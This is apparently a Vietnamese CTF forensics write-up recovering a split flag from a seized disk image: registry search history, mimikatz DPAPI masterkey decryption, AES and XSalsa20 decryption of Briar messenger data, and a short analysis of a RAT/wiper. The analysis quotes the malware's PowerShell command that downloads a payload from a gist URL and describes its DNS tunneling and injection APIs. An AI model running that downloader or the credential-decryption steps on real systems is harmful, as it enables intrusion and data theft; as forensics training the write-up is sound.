# Deleted Secret

<img width="1625" height="731" alt="Screenshot 2026-05-10 173212" src="https://github.com/user-attachments/assets/db82dafa-38f5-4ca9-8cae-e2fb23f5165f" />

**Description**: During a cybercrime investigation, law enforcement seized a suspect’s machine while the system was still live. To prevent data loss from an imminent power failure, investigators performed a rapid acquisition of the disk. Analyze the resulting image to identify and document any relevant digital evidence.

**Link**: https://drive.google.com/drive/folders/1V8ef038LGyafImJmEvknsHZ7Q8aLnZrj?usp=sharing

Challenge này chúng ta sẽ được cung cấp 1 file system khá đầy đủ các file và folder khá rộng, nên writeup này mình chỉ sẽ ghi về phần artifact mình sử dụng chính để solve được challenge này mà không đi qua các artifact như bình thường.

Trong quá trình làm bài mình có được giúp đỡ cho 1 artifact khá mới đó là **Windows Search Index**, đây là một dịch vụ tiện ích của Microsoft Windows nó dùng để lập chỉ mục dữ liệu trên hệ thống, giúp cho user có thể dễ dàng tìm kiếm các file, email, url hoặc nội dung nhanh hơn trong Start Menu và File Explorer. Ngoài ra, chính vì cơ chế giúp dễ dàng tìm kiếm, nên nó sẽ lưu lại phàn metadata, full path file, và thậm chí là 1 phần nội dung của file đó về các hoạt động thường xuyên của người dùng.

> Indexing (lập chỉ mục) là cơ chế quản lý điều hành các dữ liệu trong hệ thống, giúp cho hệ điều hành có thể truy xuất dữ liệu nhanh hơn trong quá trình mở các tiến trình của user.

Bên trong Windows registry chúng ta có 1 subkey registry là **WordWheelQuery** bên trong lưu lại lịch sử keyword tìm kiếm các gần đây của Users trong Windows Search/File Explorer. Hoặc chúng ta cũng có thể check qua về subkey registry **TypePaths** cũng có thể chứa các path mà users đã từng đưa vào thanh tìm kiếm search bars.

-> Từ 3 phần artifact trên thì mình check qua từng cái, mình sẽ thu được 2 evidence khá quan trọng bên trong `WordWheelQuery`:

<img width="1908" height="418" alt="image" src="https://github.com/user-attachments/assets/e24f0e0f-b180-454b-af07-99c2a8aff530" />

Ở đây mình sẽ có được 2 chuỗi:

- IJFUSU2DPNLW6YLIL5EV64RTGRWGY6K7MR2W43TPL4 -> flag part1: **BKISC{Woah_I_r34lly_dunno_**
- `Mot_con_vit_xoe_r4_h4i_c4i_c4nh!!!` -> password cho file zip tí nữa nhắc đến 

Tiếp theo, artifact tiếp theo mình sử dụng là database của đoạn chat briars, phần decrypt briars mình sẽ chia thành 2 phần:

phần decrypt đoạn chat: bao gồm 2 phần:

Phần 1: decrypt clipboard pinned text:

Đầu tiên cần lấy ra file cần mang ra parse ra để decrypt là file VGV4dA==

Sau đó thực hiện parse phần header ra và bắt đầu lấy dpapi blob từ offset 45: khi đó mình mới thực hiện các bước decrypt sau:

- Đầu tiên parse blob dpapi ra, sau đó dùng mimikatz lệnh: `dpapi::blob /in:embbeding_blob.bin` -> lấy được guid cần thiết

```
mimikatz # dpapi::blob /in:embedded_dpapi.blob
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {33394d46-41d9-494e-86c7-1b0ea4d0d5c9}
```

- Sau đó bắt đầu parse ra masterkey từ guid, sid, password của user `supaduadev` lệnh: dpapi::masterkey /in:"guid" /sid:... /password: crack pass từ NTLM pass
```
mimikatz # dpapi::masterkey /in:"33394d46-41d9-494e-86c7-1b0ea4d0d5c9" /sid:S-1-5-21-4096025575-3958345073-1841117829-1001 /password:kangkong

[masterkey] with password: kangkong (normal user)
  key : 4d59a1889dfd27ae39ad952533f9c070b77e90536308ef94c331be330e3973384d28d62ce4681f670304507387c5a444f86d6a65d17a2348b366e204f6d48931
  sha1: 8ed338cb44d7c271b0e21b32ed2fe5480eaf9e2f
```


- Có được masterkey thì bắt đầu parse ra data KEK: 'dpapi::blob /in:embbeding_blob.bin /masterkey:...`
```
mimikatz # dpapi::blob /in:embedded_dpapi.blob /masterkey:4d59a1889dfd27ae39ad952533f9c070b77e90536308ef94c331be330e3973384d28d62ce4681f670304507387c5a444f86d6a65d17a2348b366e204f6d48931

 * volatile cache: GUID:{33394d46-41d9-494e-86c7-1b0ea4d0d5c9};KeyHash:8ed338cb44d7c271b0e21b32ed2fe5480eaf9e2f
 * masterkey     : 4d59a1889dfd27ae39ad952533f9c070b77e90536308ef94c331be330e3973384d28d62ce4681f670304507387c5a444f86d6a65d17a2348b366e204f6d48931
description :
data: 29 1b f7 6c 9f 97 01 e5 0e 27 80 31 54 9d 86 05 47 d2 d1 78 b6 3f ba f3 57 f9 26 21 68 78 55 71
```

- Tiếp theo, khi thực hiện kiểm tra kĩ lại phần header của file VGV4dA== thì sẽ phát hiện được file k được wrap bởi dpapi mà sử dung ASN.1 DER / PKCS#7 envelope, khi đó mình được chỉ sử dung lệnh `openssl asn1parse -inform DER -in VGV4dA== -i dump` -> lấy được cấu trúc bên trong của file protect bằng asn1, ta sẽ có được cái fields quan trọng sau:


- OBJECT            :pkcs7-envelopedData
- OBJECT            :id-aes256-wrap  -> key CEK -> encrypt key dùng để decrypt cho ciphertext blob của clipboard
- OBJECT            :pkcs7-data   -> phần decrypt CEK key
- OBJECT            :aes-256-gcm  -> bắt đầu thực hiện decrypt AES-256 GCM bằng nonce và recipe từ file VGV4dA==
- OCTET 	    :STRING

```
File VGV4dA==
│
├── Embedded DPAPI blob
│   └── dpapi::blob /masterkey:<masterkey>
│       └── data = KEK 32 bytes
│
├── id-aes256-wrap
│   └── encrypted CEK 40 bytes - 32 byte là key còn lại 8 byte header 
│       └── AES Key Unwrap bằng KEK
│           └── CEK 32 bytes
│
└── aes-256-gcm
    ├── nonce 12 bytes
    ├── tag length 16 bytes
    └── ciphertext + tag từ offset 0x1c5
        └── decrypt bằng CEK
            └── clipboard plaintext


DPAPI data = KEK
encrypted CEK = lấy từ OCTET STRING sau id-aes256-wrap
CEK = aes_key_unwrap(KEK, encrypted_CEK)
nonce = OCTET STRING sau aes-256-gcm
ciphertext+tag = phần data sau offset 0x1c5
plaintext = AESGCM(CEK).decrypt(nonce, ciphertext+tag, None)
```

Phần offset sẽ giúp cho chúng ta có thể strip ra được phần key byte và ciphertext byte:


  Objects				              Offset Object		Header			    value length		          Value range

Outer SEQUENCE			            0x0000			4			          0x01C1 = 449		       0x0004 → 0x01C5
DPAPI blob OCTET STRING		      0x0029			4			          0x0106 = 262		       0x002D → 0x0133
AES-256-WRAP OID		            0x0163			2			          9			                 recipe : AES key wrap
Encrypted CEK OCTET STRING	    0x016E			2			          0x28 = 40		           0x0170 → 0x0198
AES-256-GCM OID			            0x01A7			2			          9			                 recipe: AES-GCM
GCM nonce OCTET STRING		      0x01B4			2			          0x0C = 12		           0x01B6 → 0x01C2
GCM tag length INTEGER		      0x01C2			2			          1			                 value 0x10 = 16
Ciphertext + tag		            0x01C5			none			      52 bytes		           0x01C5 → EOF


Phần quy tắc length bên trong DER

vd1: có hex như sau 04 28.... -> len của bytes t2 < 0x80 -> len của object đó sẽ là 0x28 -> 40 bytes

vd2: có hex như sau 04 82 01 06... -> len của bytes t2 >= 0x80 -> len của object dựa vào [byte t2 - 80 = số lượng bytes lấy tiếp theo] -> [82 - 80 = 2] -> lấy 2 bytes tiếp theo là 01 và 06 thành offset 0x0106 = 262 bytes -> value length = 262 bytes 

Tiếp tục vào bài, bây giờ dựa vào bảng offset object thì chúng ta có thể tách được các object ra:

```
from pathlib import Path

data = Path("VGV4dA==").read_bytes()

encrypted_cek = data[0x170:0x198]
gcm_nonce = data[0x1B6:0x1C2]
ciphertext_and_tag = data[0x1C5:]

Path("encrypted_cek.bin").write_bytes(encrypted_cek)
Path("gcm_nonce.bin").write_bytes(gcm_nonce)
Path("ciphertext_and_tag.bin").write_bytes(ciphertext_and_tag)

print("Encrypted CEK:", len(encrypted_cek), encrypted_cek.hex(" "))
print("GCM nonce:", len(gcm_nonce), gcm_nonce.hex(" "))
print("Ciphertext+tag:", len(ciphertext_and_tag), ciphertext_and_tag.hex(" "))
```

Khi đó mình sẽ có được: 

```
Encrypted CEK: 40 | cf 1e 6e 54 fc 94 97 74 f1 20 f5 6c 4b 42 1d 26 2b 8d 43 2e 01 6a 7c c7 f8 0e b2 e8 b1 1c 18 99 2b 86 b1 fc 41 b5 e7 49
GCM nonce: 12 | ec bb d7 3e 34 5b d7 f5 30 f4 ba a0
Ciphertext+tag: 52 | 77 05 ed aa 6a 4a 4e a9 de d3 ed 94 80 bd 2c 44 1d 0c 98 2d ea 03 6c e0 43 6d 7e d2 28 bc af dd f0 e2 6c 42 2c bc be bc c2 d8 d6 77 69 0f 68 f7 cf ee 00 12
```

Xử lý phần encrypted CEK: thực hiện dùng KEK (Key encryption) và thuật toán AES-256 Wrap để sinh ra 1 unwrap CEK key

Dùng thuật toán sau:

aes_key_unwrap(kek, encrypted_cek), sau đó dùng aes-256 GCM để decrypt ciphertext bên trong clipboard, script sau:

```
from pathlib import Path
from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

blob = Path("VGV4dA==").read_bytes()

# data: ... từ mimikatz dpapi::blob
kek = bytes.fromhex("""
29 1b f7 6c 9f 97 01 e5 0e 27 80 31 54 9d 86 05
47 d2 d1 78 b6 3f ba f3 57 f9 26 21 68 78 55 71
""")

# OCTET STRING sau id-aes256-wrap
encrypted_cek = bytes.fromhex("""
cf 1e 6e 54 fc 94 97 74 f1 20 f5 6c 4b 42 1d 26
2b 8d 43 2e 01 6a 7c c7 f8 0e b2 e8 b1 1c 18 99
2b 86 b1 fc 41 b5 e7 49
""")

# AES-GCM nonce
nonce = bytes.fromhex("ec bb d7 3e 34 5b d7 f5 30 f4 ba a0")

# Với file này ciphertext + tag nằm sau DER wrapper, offset 0x1c5
ciphertext_and_tag = blob[0x1c5:]

# 1. unwrap CEK bằng AES-256 Key Wrap
cek = aes_key_unwrap(kek, encrypted_cek)
print("[+] CEK:", cek.hex())

# 2. decrypt AES-256-GCM
plaintext = AESGCM(cek).decrypt(nonce, ciphertext_and_tag, None)

print("[+] Raw:", plaintext)
print("[+] UTF-16LE:", plaintext.decode("utf-16le", errors="replace"))
print("[+] UTF-8:", plaintext.decode("utf-8", errors="replace"))
```

-> Gho67qqxmv36!26@@@, mật khẩu cho db.key


Phần 2: decrypt db.key 
Hướng của phần 2 sẽ là: password clipboard → scrypt KDF → XSalsa20-Poly1305 decrypt db.key → ra H2 database key 32 bytes

Format của db.key là một database key 2 của briars, sử dung thuật toán XSalsa20-Poly1305, để encrypt db.key, và chúng ta cũng có được format của db.key như sau:

```
[0:1]     format version
[1:33]    salt 32 bytes
[33:37]   scrypt cost / N
[37:61]   nonce / IV 24 bytes
[61:77]   Poly1305 MAC 16 bytes
[77:]     XSalsa20 ciphertext

Khi đó mình cũng sẽ có được phần recipe như sau:

format = 00

salt =
f6 3d a9 bc 7c 92 65 b5 0e 5f d9 21 c7 29 79 94
84 e9 96 7f fb 6b af e1 be 2c 0c 03 f3 e3 0a f9

cost bytes = 00 02 00 00
cost / N = 131072

nonce =
ed 30 f3 39 74 fa 27 33 d8 3d 98 30 a2 60 d6 33
20 ac 5c a0 40 23 ff 33

MAC =
f9 21 72 ef 54 7f 54 fa 26 1c 70 5e cb f9 b5 c3

ciphertext =
88 17 a6 b7 29 01 38 f7 51 ff be 8e 80 6e 1d bc
bf 61 eb 62 a9 f4 fb f6 6a aa 73 98 08 aa 77 38
```


Dùng script sau để decrypt:

```
from pathlib import Path
import hashlib
from nacl.secret import SecretBox

password = "Gho67qqxmv36!26@@@"

# db.key là ASCII hex, không phải raw binary
raw = bytes.fromhex(Path("db.key").read_text().strip())

fmt = raw[0]
salt = raw[1:33]
cost = int.from_bytes(raw[33:37], "big")
nonce = raw[37:61]

# SecretBox/PyNaCl nhận format: MAC || ciphertext
sealed = raw[61:]

print("[+] format:", fmt)
print("[+] salt:", salt.hex())
print("[+] scrypt N:", cost)
print("[+] nonce:", nonce.hex())
print("[+] sealed len:", len(sealed))

# Briar dùng scrypt với r=8, p=1, output key 32 bytes
kdf_key = hashlib.scrypt(
    password.encode("utf-8"),
    salt=salt,
    n=cost,
    r=8,
    p=1,
    dklen=32,
    maxmem=512 * 1024 * 1024
)

db_key = SecretBox(kdf_key).decrypt(sealed, nonce)

print("[+] decrypted db key len:", len(db_key))
print("[+] decrypted db key hex:")
print(db_key.hex())
```
Chúng ta sẽ có được H2 database key: `84302fcb7c58a97a8e7a4cf5fc645a3875a4359f19a1ac0187e3f24020f01e03` dùng để decrypt database của briars bên trong file ./database/db.mv.db 

Tới đây mình cần sử dụng công cụ là: h2-1.4.200.jar, link tải ở [đây](https://drive.google.com/drive/folders/1GwJ1AjIQAYCHj_Gxio5dcpoR-36lOKb7?usp=sharing), sau đó mình bắt đầu thực hiện script sau để decrypt file `db.mv.db`:

```
java -cp ./h2-1.4.200.jar org.h2.tools.ChangeFileEncryption \
  -dir . \
  -db db \
  -cipher AES \
  -decrypt 84302FCB7C58A97A8E7A4CF5FC645A3875A4359F19A1AC0187E3F24020F01E03
```
Sau khi decrypt, mình dùng tools recover để thực hiện dump lại 1 file database mới từ `db.mv.db` đã decrypt:

```
java -cp ./h2-1.4.200.jar org.h2.tools.Recover \
  -dir . \
  -db db
```
Lúc này nó sẽ tạo ra 2 file là db.h2.sql và db.mv.txt, lúc này mình thực hiện load file `db.h2.sql` kia thành 1 file database mới để dump được các raw data bên trong các thuộc tính:

```
java -cp ./h2-1.4.200.jar org.h2.tools.RunScript \
  -url "jdbc:h2:./recovered" \
  -user sa \      
  -password "" \  
  -script db.h2.sql
```

Sau khi tạo thành 1 file database mới mình thực hiện load thử các tables của database này, để chọn ra tables chứa message của briars:

```
t0b1@WIN-22VCIH563OE:/mnt/d/kali-linux/CTF/BKISC/deleted/h2dec$ java -cp ./h2-1.4.200.jar org.h2.tools.Shell \
  -url "jdbc:h2:./recovered;IFEXISTS=TRUE" \
  -user sa \
  -password "" \
  -sql "SHOW TABLES;"
TABLE_NAME          | TABLE_SCHEMA
CONTACTS            | PUBLIC
GROUPMETADATA       | PUBLIC
GROUPS              | PUBLIC
GROUPVISIBILITIES   | PUBLIC
INCOMINGKEYS        | PUBLIC
LOCALAUTHORS        | PUBLIC
MESSAGEDEPENDENCIES | PUBLIC
MESSAGEMETADATA     | PUBLIC
MESSAGES            | PUBLIC -> nơi thực hiện dump phần tin nhắn trong briar
OFFERS              | PUBLIC
OUTGOINGKEYS        | PUBLIC
PENDINGCONTACTS     | PUBLIC
SETTINGS            | PUBLIC
STATUSES            | PUBLIC
TRANSPORTS          | PUBLIC
(15 rows, 110 ms)
```

Sau đó tiếp tục bắt đầu dump message raw data ra:

```
t0b1@WIN-22VCIH563OE:/mnt/d/kali-linux/CTF/BKISC/deleted/h2dec$ java -cp ./h2-1.4.200.jar org.h2.tools.Shell \
  -url "jdbc:h2:./recovered;IFEXISTS=TRUE" \
  -user sa \
  -password "" \
  -sql "SELECT * FROM MESSAGES LIMIT 5;"
MESSAGEID                                                        | GROUPID                                                          | TIMESTAMP     | STATE | SHARED | TEMPORARY | CLEANUPTIMERDURATION | CLEANUPDEADLINE | LENGTH | RAW
6b596344ea78560e399e07e4b93e4a3bf80aeb5e7a2b02e73a9ab4689efd2433 | 2d0f35130fa045381b469c79f66714de1b59e0acf4468898072738d05d26b30a | 1774950641136 | 3     | FALSE  | FALSE     | null                 | null            | 563    | 2d0f35130fa045381b469c79f66714de1b59e0acf4468898072738d05d26b30a0000019d434d6df06060412b6f72672e6272
fdac80929756ecde37773223da2db09fbdfbc62676b9aad2806529e3605af139 | 8bc014f18e9e7491eb12bf7ec5faba537131df93351fa2b36519aecd5f0cec52 | 1774950641604 | 3     | FALSE  | FALSE     | null                 | null            | 161    | 8bc014f18e9e7491eb12bf7ec5faba537131df93351fa2b36519aecd5f0cec520000019d434d6fc460411c6f72672e627269
94a80cd6da68473b1a9ed71872f0f7f26bf12ab0a4225e8d6818d72bc18d3507 | 8bc014f18e9e7491eb12bf7ec5faba537131df93351fa2b36519aecd5f0cec52 | 1774950646281 | 3     | FALSE  | FALSE     | null                 | null            | 142    | 8bc014f18e9e7491eb12bf7ec5faba537131df93351fa2b36519aecd5f0cec520000019d434d820960411c6f72672e627269
ed4f0598638cde19d6a074f002b48d2c23320bc63fd80c44a65fbdf0b827aa77 | 4b07a225d2486d453fdd981b7807b84b7e0f0f19eec3c3e19099b0a7415b6eb9 | 1774951102386 | 3     | TRUE   | FALSE     | null                 | null            | 56     | 4b07a225d2486d453fdd981b7807b84b7e0f0f19eec3c3e19099b0a7415b6eb90000019d435477b260210160602101210080
5566357797050034ed0cd43d0bc7778de7adde4b06a4924cb6bfdd88592f16c8 | 9d87e679013d442110376d473b9fe617ed788a1ab12a86f3d92625db102247a9 | 1774951102386 | 3     | TRUE   | FALSE     | null                 | null            | 142    | 9d87e679013d442110376d473b9fe617ed788a1ab12a86f3d92625db102247a90000019d435477b260411c6f72672e627269
(data is partially truncated)
(5 rows, 56 ms)
```
Lúc này thì phần data bên trong raw có cấu trúc như sau:

```
[0:32]   GROUPID
[32:40]  TIMESTAMP, big-endian 8 bytes
[40:]    message body / BDF-like encoded payload
```
Nên cần phải parse text riêng ra bằng script sau:
```
import csv
import re
from datetime import datetime, timezone, timedelta

VN = timezone(timedelta(hours=7))

def ascii_strings(data, min_len=2):
    return [
        s.decode("utf-8", errors="replace")
        for s in re.findall(rb"[\x20-\x7e]{" + str(min_len).encode() + rb",}", data)
    ]

with open("messages_raw.csv", newline="", encoding="utf-8") as f:
    rows = csv.DictReader(f)

    for row in rows:
        rawhex = row["RAWHEX"]
        if not rawhex or rawhex.lower() == "null":
            continue

        raw = bytes.fromhex(rawhex)
        strings = ascii_strings(raw, 2)

        interesting = []
        for s in strings:
            if s.startswith("org.briar"):
                continue
            if len(s.strip()) < 2:
                continue
            interesting.append(s.strip("`\x00\x80"))

        if not interesting:
            continue

        ts = int(row["TIMESTAMP"])
        t = datetime.fromtimestamp(ts / 1000, tz=VN).strftime("%Y-%m-%d %H:%M:%S %z")

        print("=" * 80)
        print("TIME:", t)
        print("MESSAGEID:", row["MESSAGEID"])
        print("LENGTH:", row["LENGTH"])
        for s in interesting:
            print("TEXT:", s)
```
Khi đó mình sẽ thu được 1 link drive:

```
================================================================================
TIME: 2026-04-29 02:17:43 +0700
MESSAGEID: 0f557ae6821b5108d0d76dc5372b5e2a211d51a28697478a66f292b18324c668
LENGTH: 132
TEXT: b2
TEXT: z2M
TEXT: =`!
TEXT: AT https://drive.google.com/drive/folders/1GwJ1AjIQAYCHj_Gxio5dcpoR-36lOKb7?usp=sharing
================================================================================
```
Trong drive, mình sẽ tải về 1 file tools.zip chính là file mã độc được sử dụng trong file system, mình reverse đơn giản bằng cách check strings thì thấy được 1 lệnh powershell thực hiện download về từ gist.githubusercontent.com 1 cái dì đấy:

<img width="1427" height="698" alt="image" src="https://github.com/user-attachments/assets/279304a8-5cbc-4020-9fe2-4f8f3c384e41" />

Mình truy cập vào link git đó thì có được 1 chuỗi base45:

<img width="1426" height="435" alt="image" src="https://github.com/user-attachments/assets/ae8dcd3e-fd63-49cd-a650-59268a6a231c" />

-> D4F8%E13C856HPELFF+8DZKE+2C856PEDX CE2CS-BZ2 -> decode base45 sẽ có được part 2: **whut_t0_s4y_here_n0_idea_T^T}**

**full flag: BKISC{Woah_I_r34lly_dunno_whut_t0_s4y_here_n0_idea_T^T}**

---

Nói thêm về con malware trên

<img width="3759" height="1048" alt="image" src="https://github.com/user-attachments/assets/36a7dff7-213a-4911-8fd4-f0b6a517ae7e" />

Đây là 1 con trojan giả dạng 1 file tools.exe thông thường, chức năng của nó là dùng để thực **remote access controll (RAT)**, nó thực hiện các hành động sau:

- Đầu tiên thực hiện tải payload về bằng tiến trình powershell: `Powershell.exe -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-ObjectSystem.Net.WebClient).DownloadString('https://gist.githubusercontent.com/Amesame/76aecb869de8911eb65fb33458d8edfd/raw')"` - Lệnh này tải về 1 payload mà mình decode ra sẽ là flag part 2.

- Nó thực hiện C2 server qua 2 web chat là: **hichat.com** và **yochat.com** —> các nền tảng chat được dùng làm kênh C2 (nhận lệnh/gửi dữ liệu)
DNS Tunneling
  - `nslookup + >nul 2>&1` — sử dụng nslookup để thực hiện DNS query, đây là kỹ thuật DNS tunneling dùng để:
    - Exfiltrate dữ liệu qua DNS queries
    - Nhận lệnh C2 qua DNS responses (thường dùng TXT records)
    - Giấu kết quả (>nul 2>&1)

- Sau đó thực hiện xóa tất cả các file với đuôi sau:
<img width="1618" height="984" alt="image" src="https://github.com/user-attachments/assets/4b6f996a-c37e-4eb7-89c8-f83705168710" />

 Từ KERNEL32.dll — Process Injection & Anti-Debug

  ┌───────────────────────────────────────────────┬───────────────────────────────────────────────────────────────────────┐
  │                      Hàm                      │                               Mục đích                                │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
  │ OpenProcess                                   │ Mở handle tới process khác                                            │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
  │ GetThreadContext / SetThreadContext           │ Process Injection — đọc/ghi context thread (có thể dùng để redirect   │
  │                                               │ execution tới shellcode)                                              │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
  │ SuspendThread / ResumeThread                  │ Đình chỉ/khôi phục thread — dùng trong injection                      │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
  │ VirtualProtect                                │ Thay đổi quyền bộ nhớ (làm cho bộ nhớ có thể thực thi)                │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
  │ IsDebuggerPresent                             │ Anti-Debugging — kiểm tra xem có debugger đang gắn vào không          │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
  │ DeleteFileA                                   │ Xóa file                                                              │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
  │ GetProcAddress / GetModuleHandleA             │ Dynamic API resolution — phân giải API lúc runtime                    │
  ├───────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────┤
  │ CreateEventA / CreateSemaphoreA /             │ Đồng bộ hóa thread                                                    │
  │ WaitForMultipleObjects                        │                                                                       │
  └───────────────────────────────────────────────┴───────────────────────────────────────────────────────────────────────┘

 Từ CRT — Thực thi lệnh & File I/O

  ┌──────────────────────────────────────────────────┬───────────────────────────────┐
  │                       Hàm                        │           Mục đích            │
  ├──────────────────────────────────────────────────┼───────────────────────────────┤
  │ system()                                         │ Thực thi lệnh shell trực tiếp │
  ├──────────────────────────────────────────────────┼───────────────────────────────┤
  │ _popen() / _pclose()                             │ Thực thi lệnh và đọc output   │
  ├──────────────────────────────────────────────────┼───────────────────────────────┤
  │ _beginthreadex                                   │ Tạo thread mới                │
  ├──────────────────────────────────────────────────┼───────────────────────────────┤
  │ fopen / fwrite / fread / fclose / _write / _read │ Đọc/ghi file đầy đủ           │
  ├──────────────────────────────────────────────────┼───────────────────────────────┤

Kết luận: 

 Loại malware: Đây là một **RAT (Remote Access Trojan)** kết hợp Wiper/Data Destroyer với các đặc điểm:

  1. C2 đa kênh: GitHub Gist (tải payload), chat platforms (hichat/yochat), DNS tunneling (nslookup)
  2. Process Injection: Có đủ primitive (SetThreadContext + SuspendThread + ResumeThread + VirtualProtect) để inject shellcode
   vào process khác
  3. Phá hoại dữ liệu: Duyệt và xóa file với 34 đuôi mở rộng trong Documents và Desktop
  4. Anti-Debugging: IsDebuggerPresent để tránh bị phân tích
  5. Thực thi lệnh: system() và _popen() cho phép chạy bất kỳ lệnh shell nào
  6. Mã hóa Base32: Dùng để mã hóa dữ liệu (có thể dùng trong DNS tunneling hoặc mã hóa payload)




















